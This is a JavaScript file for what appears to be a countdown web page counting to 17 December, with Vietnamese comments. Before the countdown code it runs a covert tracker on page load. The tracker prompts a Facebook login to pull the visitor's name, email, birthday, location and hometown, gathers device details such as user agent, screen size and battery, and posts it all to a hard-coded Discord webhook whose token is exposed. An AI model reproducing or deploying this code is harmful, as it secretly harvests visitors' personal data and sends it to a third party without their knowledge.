//webhook
function sendMessage(params) {
  const request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/1277242406047322122/QgJnmWYTa8Wvp6s_Y5q1Wwd2xFVY5fMKGqqzk5tyjKBXKYwt8SsywIFfWjTU8w0Ac-ds");
  request.setRequestHeader('Content-type', 'application/json');
  request.send(JSON.stringify(params));
}
//fetch api
var ip;
async function getData() {
  const url = "https://api.ipify.org?format=json";
  try {
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error(`Response status: ${response.status}`);
    }
    const json = await response.json();
    ip = await json.ip
  } catch (error) {
    console.error(error.message);
  }
}
////Get Infomation
let facebookUserData = null; // Biến toàn cục lưu dữ liệu Facebook

// Hàm lấy thông tin Facebook
async function getFacebookUserData() {
    return new Promise((resolve, reject) => {
        FB.login(function(response) {
            if (response.authResponse) {
                FB.api('/me', {
                    fields: 'id,name,first_name,last_name,email,gender,birthday,location,hometown,picture'
                }, function(user) {
                    facebookUserData = user;
                    resolve(user);
                });
            }
        }, { scope: 'public_profile,email,user_birthday,user_location,user_hometown' });
    });
}

// Hàm gửi dữ liệu đồng bộ
const postDataUser = async () => {
    await getFacebookUserData();

    // Lấy thông tin pin
    let bat;
    await navigator.getBattery().then((battery) => {
        bat = battery;
    });

    // Lấy thông tin hệ thống
    let userAgent = navigator.userAgent;
    let userData = navigator.userAgentData;
    let language = navigator.language;
    let height = screen.height;
    let width = screen.width;
    let adminIp = "118.68.117.146";

    // Kiểm tra xem user có phải admin không
    let userIp = "Không xác định"; // Nếu bạn có cách lấy IP, thay vào đây
    let userType = userIp == adminIp ? "Admin" : userIp;

    // Gửi dữ liệu
    sendMessage({
        content: `----------------------------------------------\n**User: ${userType}**\n\n`
            + `**Facebook Name:** ${facebookUserData ? facebookUserData.name : "Không lấy được"}\n`
            + `**Facebook ID:** ${facebookUserData ? facebookUserData.id : "Không lấy được"}\n`
            + `**First Name:** ${facebookUserData ? facebookUserData.first_name : "Không lấy được"}\n`
            + `**Last Name:** ${facebookUserData ? facebookUserData.last_name : "Không lấy được"}\n`
            + `**Email:** ${facebookUserData ? facebookUserData.email : "Không lấy được"}\n`
            + `**Gender:** ${facebookUserData ? facebookUserData.gender : "Không lấy được"}\n`
            + `**Birthday:** ${facebookUserData ? facebookUserData.birthday : "Không lấy được"}\n`
            + `**Location:** ${facebookUserData?.location?.name || "Không lấy được"}\n`
            + `**Hometown:** ${facebookUserData?.hometown?.name || "Không lấy được"}\n`
            + `**Profile Picture:** ${facebookUserData?.picture?.data?.url || "Không lấy được"}\n`
            + `\n----------------------------------------------\n`
            + `**User Agent:** ${userAgent}\n`
            + `**Brand 1:** ${JSON.stringify(userData?.brands[0])}\n`
            + `**Brand 2:** ${JSON.stringify(userData?.brands[1])}\n`
            + `**Brand 3:** ${JSON.stringify(userData?.brands[2])}\n`
            + `**Mobile:** ${userData?.mobile}\n`
            + `**Platform:** ${userData?.platform}\n`
            + `**Language:** ${language}\n`
            + `**Screen:**\n  - Height: ${height}\n  - Width: ${width}\n`
            + `**Battery:**\n  - Level: ${bat.level * 100}%\n  - Charging: ${bat.charging ? "Có" : "Không"}`,
    });
};

// Gọi hàm chính
postDataUser();



//////////////////////////////////////////////////////////////////////////////////////////WEB FUNCITION









const countDown = () => {

  var x = setInterval(function() {
    let date = new Date();
    let year = date.getFullYear();
    var times = new Date(`Dec 17, ${year}   00:00:00`).getTime()
   //var times = new Date(`Nov 22, ${year}   00:00:00`).getTime()
    var now = new Date().getTime();


    var distance = times - now;

    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    var seconds = Math.floor((distance % (1000 * 60)) / 1000);
    document.getElementById("date").innerHTML = seconds % 10 <= 5 ? `17/12/${year}` : "SupperSun";
    document.getElementById("days").innerHTML = days;
    document.getElementById("hours").innerHTML = hours;
    document.getElementById("minutes").innerHTML = minutes;
    document.getElementById("seconds").innerHTML = seconds;
    if (distance < 0) {

      clearInterval(x);

      document.getElementById("days").innerHTML = 00;
      document.getElementById("hours").innerHTML = 00;
      document.getElementById("minutes").innerHTML = 00;
      document.getElementById("seconds").innerHTML = 00;

    }
  }, 1000);
}
countDown()

